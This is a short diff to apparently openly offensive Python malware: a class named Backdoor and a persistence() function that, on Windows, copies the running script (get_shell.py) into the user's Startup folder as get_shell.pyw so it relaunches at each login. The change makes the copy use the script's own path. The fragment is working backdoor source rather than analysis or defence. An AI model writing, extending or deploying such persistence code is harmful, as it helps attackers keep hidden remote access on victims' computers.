@@ -110,12 +110,11 @@ class Backdoor:
 
 def persistence():
 	if os.name == 'nt':
-		script_path = "C:\\Users\\$PATH\\get_shell.py"
+		script_path = os.path.abspath(sys.argv[0])  #script_path = "C:\\Users\\$PATH\\get_shell.py"
 		startup_dir = os.path.join(os.getenv("APPDATA"), "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
 		startup_file = os.path.join(startup_dir, "get_shell.pyw")
 
 		if not os.path.isfile(startup_file) or os.stat(script_path).st_mtime > os.stat(startup_file).st_mtime:
-			# copy get_shell script to the startup directory
 			shutil.copyfile(script_path, startup_file)
 	else:
 		script_path = os.path.abspath('get_shell.py')
